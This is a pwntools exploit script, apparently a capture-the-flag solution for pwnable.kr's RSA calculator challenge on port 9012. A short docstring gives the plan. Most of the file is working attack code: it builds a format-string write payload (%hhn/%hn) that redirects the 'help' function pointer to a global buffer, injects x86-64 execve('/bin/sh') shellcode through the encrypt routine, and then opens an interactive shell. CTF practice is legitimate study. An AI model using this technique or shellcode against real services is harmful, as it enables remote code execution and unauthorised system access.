from pwn import *

context.log_level = "warning"

"""
Exploit plan
<Bug>
    FSB on RSA_decrypt >>> printf(g_pbuf)

    offset_70 : rbp -> offset_206
    offset_76 : plain input
    offset_205 : canary
    offset_206 : SFP
    offset_207 : RET
    
<GOAL>
put g_pbuf address at "4.help(0x602518)" Using RSA_decrypt and FSB.
Inject shellcode in g_pbuf Using RSA_encrypt.
Execute "4.help"

1. Set any key, p=16, q=16, e=1, d=1
2. RSA_decrypt
    use FSB, help -> g_pbuf
        0x602518 : 0x602560
3. RSA_encrypt(shellcode)
4. Select "4.help"    
"""
def rsa_encrypt(txt):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b": ")
    p.sendline(b"1024")
    p.recvline()
    p.sendline(txt)
    p.recvline()
    return p.recvuntil(b"-")[:-3]


def rsa_decrypt(txt):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b": ")
    p.sendline(b"1024")
    p.recvline()
    p.sendline(txt)
    p.recvline()
    return p.recvuntil(b"-")[:-3]


p = remote("pwnable.kr", 9012)

help_add_8 = 0x602518
help_add_a = 0x60251a

shellcode = b"\x48\x31\xff\x48\x31\xf6" \
            b"\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"


# 1.set key pair, p=16, q=16, e=1, d=1
key_pair = [b"16", b"16", b"1", b"1"]
p.recvuntil(b"> ")
p.sendline(b"1")
for i in range(4):
    p.recvuntil(b": ")
    p.sendline(key_pair[i])

# 2.RSA_decrypt-FSB, set help -> g_pbuf.
# g_pbuf=0x602560 >>> 0x60251a:0x60 | 0x602518:0x2560
pay = "%{}c".format(0x60)
pay += "%{}$hhn".format(79)      # base offset is 76. 76 + len(pay) / 8
pay += "%{}c".format(0x2560-0x60)
pay += "%{}$hn".format(80)
pay += "A"*(8-len(pay) % 8)
print(len(pay))
plain = pay.encode() + p64(help_add_a) + p64(help_add_8)
enc = rsa_encrypt(plain)
dec = rsa_decrypt(enc)

print("plain: ", plain)
print("enc: ", enc)
print("dec: ", dec)

# 3. Inject shellcode.
rsa_encrypt(shellcode)
p.sendline(b"4")
p.interactive()
